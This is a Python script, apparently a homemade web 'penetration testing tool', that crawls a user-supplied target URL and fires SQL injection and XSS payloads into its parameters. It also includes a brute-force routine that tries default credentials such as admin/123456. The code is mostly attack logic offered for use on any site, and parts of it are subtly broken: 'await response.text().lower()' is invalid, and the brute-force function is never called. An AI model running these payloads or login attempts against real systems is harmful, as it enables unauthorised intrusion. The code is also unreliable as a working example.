import aiohttp
import asyncio
import json
import random
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from tqdm import tqdm
from datetime import datetime

# نمایش لوگو BK در صفحه اصلی
def print_banner():
    print(r"""
    ██████╗ ██╗  ██╗
    ██╔══██╗██║  ██║
    ██████╔╝███████║
    ██╔═══╝ ██╔══██║
    ██║     ██║  ██║
    ╚═╝     ╚═╝  ╚═╝
    """)
    print("\n🔹 Advanced Penetration Testing Tool by BKXDev\n")

class PentestTool:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = aiohttp.ClientSession()
        self.links_to_scan = set()
        self.scanned_links = set()
        self.vulnerabilities = []
        self.report_file = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    async def extract_links(self, url):
        """استخراج لینک‌ها از صفحه"""
        try:
            async with self.session.get(url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                for link in soup.find_all("a", href=True):
                    full_url = urljoin(url, link["href"])
                    if self.target_url in full_url and full_url not in self.scanned_links:
                        self.links_to_scan.add(full_url)
        except Exception as e:
            print(f"[!] Error extracting links from {url}: {e}")

    async def scan_security_headers(self, url):
        """بررسی هدرهای امنیتی"""
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                missing_headers = [
                    h for h in ["Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options"]
                    if h not in headers
                ]
                if missing_headers:
                    self.vulnerabilities.append({"url": url, "type": "Missing Headers", "details": missing_headers})
        except Exception as e:
            print(f"[!] Error checking headers on {url}: {e}")

    async def scan_sql_injection(self, url):
        """بررسی SQL Injection"""
        payloads = ["' OR 1=1 --", "' UNION SELECT NULL,NULL --"]
        params = self.extract_params(url)
        for param in params:
            for payload in payloads:
                sql_url = self.inject_payload(url, param, payload)
                try:
                    async with self.session.get(sql_url) as response:
                        if "syntax error" in await response.text().lower():
                            self.vulnerabilities.append({"url": sql_url, "type": "SQL Injection", "payload": payload})
                except Exception as e:
                    print(f"[!] SQL Injection error on {sql_url}: {e}")

    async def scan_xss(self, url):
        """بررسی XSS"""
        payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)']
        params = self.extract_params(url)
        for param in params:
            for payload in payloads:
                xss_url = self.inject_payload(url, param, payload)
                try:
                    async with self.session.get(xss_url) as response:
                        if payload in await response.text():
                            self.vulnerabilities.append({"url": xss_url, "type": "XSS", "payload": payload})
                except Exception as e:
                    print(f"[!] XSS error on {xss_url}: {e}")

    async def brute_force_login(self, login_url):
        """Brute Force روی صفحه لاگین"""
        credentials = [("admin", "123456"), ("admin", "password"), ("user", "1234")]
        for username, password in credentials:
            data = {"username": username, "password": password}
            try:
                async with self.session.post(login_url, data=data) as response:
                    if "incorrect password" not in await response.text().lower():
                        self.vulnerabilities.append({"url": login_url, "type": "Brute Force", "credentials": (username, password)})
            except Exception as e:
                print(f"[!] Brute force error on {login_url}: {e}")

    def extract_params(self, url):
        """استخراج پارامترهای URL"""
        parsed_url = urlparse(url)
        return list(parse_qs(parsed_url.query).keys())

    def inject_payload(self, url, param, payload):
        """تزریق Payload"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        query[param] = payload
        new_query = "&".join(f"{k}={v}" for k, v in query.items())
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

    async def start_scan(self):
        """شروع اسکن"""
        print(f"[*] Scanning {self.target_url}...")
        self.links_to_scan.add(self.target_url)
        await self.extract_links(self.target_url)

        with tqdm(total=len(self.links_to_scan)) as pbar:
            while self.links_to_scan:
                url = self.links_to_scan.pop()
                if url not in self.scanned_links:
                    self.scanned_links.add(url)
                    pbar.update(1)
                    await asyncio.gather(
                        self.scan_security_headers(url),
                        self.scan_sql_injection(url),
                        self.scan_xss(url),
                    )
        await self.generate_report()

    async def generate_report(self):
        """ایجاد گزارش JSON"""
        with open(self.report_file, "w") as f:
            json.dump(self.vulnerabilities, f, indent=4)
        print(f"[!] Report saved to {self.report_file}")
        await self.session.close()

# اجرای ابزار
if __name__ == "__main__":
    print_banner()
    target = input("🔹 Enter target URL: ")
    scanner = PentestTool(target)
    asyncio.run(scanner.start_scan())
